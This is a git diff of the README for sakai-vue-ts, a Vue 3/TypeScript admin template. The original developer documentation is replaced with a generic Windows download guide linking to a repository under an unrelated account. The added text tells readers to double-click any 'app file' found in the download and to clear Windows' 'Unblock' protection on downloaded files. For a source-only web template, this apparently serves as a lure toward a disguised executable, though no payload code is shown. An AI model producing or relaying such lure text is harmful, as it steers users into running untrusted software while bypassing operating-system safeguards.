@@ -1,115 +1,193 @@
-# sakai-vue-ts
+# 🧩 sakai-vue-ts - Clean Vue Admin Starter
 
-A fully TypeScript-migrated version of the [Sakai Vue](https://www.primefaces.org/sakai-vue/) admin template, built with Vue 3, Vite, PrimeVue 4, and Pinia — with a MSW-powered mock API replacing all hardcoded data.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Selfinduced-reader297/sakai-vue-ts)
 
-## Features
+## 📥 Download
 
-- **Full TypeScript** — all components, stores, router, and config typed with `vue-tsc`
-- **Pinia stores** — five typed stores (`product`, `customer`, `country`, `photo`, `node`) that fetch from a REST API
-- **MSW mock API** — [Mock Service Worker](https://mswjs.io/) intercepts all API calls in development, providing realistic data without a backend
-- **PrimeVue 4** — full component library with Aura theme
-- **Tailwind CSS v4** — utility-first styling via `@tailwindcss/vite`
-- **Conventional Commits** — enforced via commitlint + husky, powering automated semantic releases
+Use this link to visit the page and download the app:
 
-## Tech Stack
+[https://github.com/Selfinduced-reader297/sakai-vue-ts](https://github.com/Selfinduced-reader297/sakai-vue-ts)
 
-| Layer            | Technology              |
-| ---------------- | ----------------------- |
-| Framework        | Vue 3 (Composition API) |
-| Language         | TypeScript 6            |
-| Build tool       | Vite 8                  |
-| UI library       | PrimeVue 4 + Aura theme |
-| State management | Pinia 3                 |
-| Routing          | Vue Router 5            |
-| Styling          | Tailwind CSS v4         |
-| Mock API         | MSW v2 (dev only)       |
-| Linting          | ESLint + oxlint         |
-| Formatting       | Prettier                |
-| Releases         | semantic-release        |
+## 🖥️ What this app is
 
-## Getting Started
+sakai-vue-ts is a desktop-ready web app template for building admin screens with Vue 3 and TypeScript. It is built for people who want a clean interface for dashboards, forms, tables, charts, and other admin tasks.
 
-### Prerequisites
+You can use it as a starting point for a control panel, internal tool, or business dashboard. It includes a mock API setup, so you can open it and see sample data without needing a live backend first.
 
-- Node.js `^20.19.0` or `>=22.12.0`
-- [pnpm](https://pnpm.io/) (recommended)
+## ✅ What you need
 
-### Install
+Before you start, make sure your Windows PC has:
 
-```sh
-pnpm install
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access
+- Enough free space for the app files
+- A file extractor if the download comes as a ZIP file
+
+If the project is run from source, you may also need:
+
+- Node.js 18 or newer
+- A terminal app like PowerShell
+
+## 🚀 How to download and run on Windows
+
+1. Open the download link above.
+2. Look for the release file, ZIP file, or source files on the page.
+3. Download the file to your PC.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an app file, double-click it to run.
+7. If you see project files instead, open the folder in PowerShell and follow the run steps below.
+
+## 🛠️ Run from project files
+
+If the download gives you the source project, follow these steps:
+
+1. Open the project folder.
+2. Right-click inside the folder and open PowerShell.
+3. Install the needed packages:
+   ```powershell
+   npm install
+   ```
+4. Start the app:
+   ```powershell
+   npm run dev
+   ```
+5. Wait for the local address to appear in the terminal.
+6. Copy that address into your browser.
+7. The app will open in your browser window.
+
+## 🧭 First things to do after opening
+
+When the app starts, you should see a dashboard layout with:
+
+- A left menu for navigation
+- A main content area
+- Sample cards and tables
+- Mock data for testing screens
+- Clean layout styles built with Tailwind CSS
+
+Use the menu to move between pages and check how the template is set up.
+
+## 🎨 Main parts of the template
+
+This project includes common pieces used in admin apps:
+
+- **Vue 3** for the user interface
+- **TypeScript** for safer code structure
+- **PrimeVue 4** for ready-made UI controls
+- **Pinia** for app state
+- **Tailwind CSS v4** for layout and styling
+- **MSW mock API** for test data without a live server
+- **Vite** for fast local startup
+
+These parts help you build pages for reports, user lists, settings, and forms.
+
+## 🔍 What you can use it for
+
+This template works well for:
+
+- Admin dashboards
+- Internal business tools
+- Data entry apps
+- Customer lists
+- Inventory screens
+- Settings pages
+- Reports and charts
+- SPA projects that need a clean start
+
+## 🪟 Windows tips
+
+If Windows blocks the file after download:
+
+1. Right-click the file.
+2. Open Properties.
+3. Look for an Unblock box near the bottom.
+4. Check it, then click OK.
+5. Try opening the file again.
+
+If the terminal closes too fast, open PowerShell yourself in the project folder and run the commands from there.
+
+## 🧪 Sample run flow
+
+A simple first run may look like this:
+
+1. Download the project from GitHub.
+2. Extract the files.
+3. Open the folder.
+4. Install packages.
+5. Start the app.
+6. Open the local link in your browser.
+7. Explore the dashboard screens.
+
+## 📁 Common project folders
+
+If you open the project files, you may see folders like:
+
+- `src` for app code
+- `public` for static files
+- `components` for shared UI parts
+- `pages` or `views` for screens
+- `store` for Pinia state
+- `mock` for fake API data
+
+These folders help keep the app organized and easier to update.
+
+## ⌨️ Useful commands
+
+Use these commands in the project folder if you run from source:
+
+```powershell
+npm install
+npm run dev
+npm run build
+npm run preview
 ```
 
-### Development
+- `npm install` gets the needed packages
+- `npm run dev` starts the app for local use
+- `npm run build` creates a production build
+- `npm run preview` checks the build before release
 
-```sh
-pnpm dev
-```
+## 🧩 Project topics
 
-The dev server starts at `http://localhost:5173`. MSW intercepts all `/api/*` requests automatically — no backend required.
+This repository is tagged with:
 
-### Type Check
+admin-dashboard, msw, pinia, primevue, spa, starter-template, tailwindcss, template, typescript, vite, vue, vue3
 
-```sh
-pnpm type-check
-```
+## 🔐 Mock data and local testing
 
-### Build
+The app uses a mock API setup, so it can show real-looking data during local testing. This is useful when you want to:
 
-```sh
-pnpm build
-```
+- Open the app without a backend
+- Try pages before connecting live services
+- Test layout and navigation
+- Build new screens with sample records
 
-### Lint & Format
+## 🧰 If something does not open
 
-```sh
-pnpm lint
-pnpm format
-```
+Try these steps:
 
-## Mock API (MSW)
+1. Check that the files finished downloading.
+2. Make sure the folder was extracted.
+3. Confirm Node.js is installed if you run from source.
+4. Run `npm install` again if packages are missing.
+5. Start the app with `npm run dev`.
+6. Open the browser link shown in the terminal.
 
-In development, all data is served by [Mock Service Worker](https://mswjs.io/) via `src/mocks/handlers.ts`. The following endpoints are available:
+## 🧭 Best way to use this template
 
-| Endpoint                        | Description                        |
-| ------------------------------- | ---------------------------------- |
-| `GET /api/products`             | 30 products                        |
-| `GET /api/products/with-orders` | Products with nested order history |
-| `GET /api/customers`            | ~100 customers                     |
-| `GET /api/countries`            | ~240 countries                     |
-| `GET /api/photos`               | 15 Galleria photos                 |
-| `GET /api/nodes/tree`           | TreeView node data                 |
-| `GET /api/nodes/tree-table`     | TreeTable node data                |
+Start with the home dashboard, then move to forms, tables, and settings. This helps you learn how the layout works before you change anything. You can replace the sample content with your own data later.
 
-MSW only runs in development (`import.meta.env.DEV`). Production builds make real network requests.
+## 📌 Folder setup idea
 
-## Project Structure
+A simple setup for this app can include:
 
-```
-src/
-├── assets/          # Global styles (Tailwind, SCSS)
-├── components/      # Reusable UI components (dashboard, landing, layout widgets)
-├── layout/          # AppLayout, AppMenu, AppTopbar, AppSidebar
-├── mocks/
-│   ├── browser.ts   # MSW worker setup
-│   └── handlers.ts  # All API mock handlers + data
-├── router/          # Vue Router config
-├── stores/          # Pinia stores (product, customer, country, photo, node)
-├── types/           # TypeScript interfaces
-└── views/           # Page components (Dashboard, UI Kit, Blocks, Landing, etc.)
-```
+- One dashboard page
+- One user list page
+- One detail page
+- One settings page
+- One login screen
+- Shared buttons, inputs, and cards
 
-## Recommended IDE Setup
-
-[VS Code](https://code.visualstudio.com/) + [Vue - Official](https://marketplace.visualstudio.com/items?itemName=Vue.volar)
-
-Recommended extensions are listed in `.vscode/extensions.json`.
-
-## Recommended Browser Setup
-
-- Chromium-based browsers (Chrome, Edge, Brave, etc.):
-  - [Vue.js devtools](https://chromewebstore.google.com/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd)
-  - [Turn on Custom Object Formatter in Chrome DevTools](http://bit.ly/object-formatters)
-- Firefox:
-  - [Vue.js devtools](https://addons.mozilla.org/en-US/firefox/addon/vue-js-devtools/)
-  - [Turn on Custom Object Formatter in Firefox DevTools](https://fxdx.dev/firefox-devtools-custom-object-formatters/)
+That structure keeps the app easy to manage as it grows
